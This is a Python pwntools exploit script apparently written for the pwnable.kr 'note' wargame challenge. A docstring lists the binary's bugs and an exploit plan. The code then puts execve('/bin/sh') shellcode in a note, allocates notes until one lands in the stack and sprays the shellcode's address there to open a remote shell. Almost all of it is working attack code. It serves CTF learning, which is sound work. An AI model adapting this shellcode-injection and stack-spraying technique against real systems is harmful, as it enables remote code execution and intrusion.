from pwn import *
from time import sleep
import re
"""
[Protections]
-NX, Partial RELRO
[Bug]
    No ASLR !!
    mem_arr[256] - always empty
    write_note.gets() - over flow
    select_menu > recursive > pile stack infinitely
    0x31337(201527) >> hacker menu    
    mmap_s() - fd used after closed.
    
[Address]
    0xfffdd000 - 0xffffe000 (stack)

[Exploit-stack elevation]
    1. create first note & write shellcode. store shellcode address.
    2. create notes checking address that disclosure.
        compare address above and initial_ebp - 0x4c0 * n
    3. if address reach to stack, use menu-3(write) to fill the note with shell code address.
    4. menu-5
"""


def create():
    p.sendline(b"1")
    res = p.recvuntil(b"exit\n").decode()
    reg = re.compile(r'no.\d{1,3}')
    note_num = reg.search(res).group().split()[1]
    reg = re.compile(r'\[.*]')
    note_add = reg.search(res).group()[1:-1]
    print("[+]No: ", note_num)
    print("[+]Note addr: ", note_add)
    return note_num, note_add


def write(no, pay):
    p.sendline(b"2")
    p.sendline(no.encode())
    p.sendline(pay)
    print("[+]Write note num: ", no)
    p.recvuntil(b"exit\n")


def delete(no):
    p.sendline(b"4")
    p.sendline(no.encode())
    p.recvuntil(b"exit\n")


p = remote("pwnable.kr", 9019)

context(arch="i386", os="linux")
context.log_level = "warning"

esp = 0xffffd360  # ebp-esp = 0x428 remote : 0xffffd360
offset = 0x430
cnt = 0
num = 0
address = 0
shellcode = asm(shellcraft.execve("/bin/sh"))

sleep(10)
p.recvuntil(b"exit\n")

# create note, write shellcode
shell_no, shell_add = create()
write(shell_no, shellcode)

shell_add = int(shell_add, 16)
pay = p32(shell_add) * (4096 // 4)

while True:
    cnt += 1
    if cnt > 255:
        delete(255)
        cnt -= 1
        print("[+]note deleted")
        continue
    esp -= offset
    print("[*]Current esp: ", hex(esp))

    num, address = create()
    if int(address, 16) >= esp:
        print("My note is in Stack!! no: ", num, "address: ", address)
        break

write(num, pay)
p.sendline(b"5")
p.interactive()
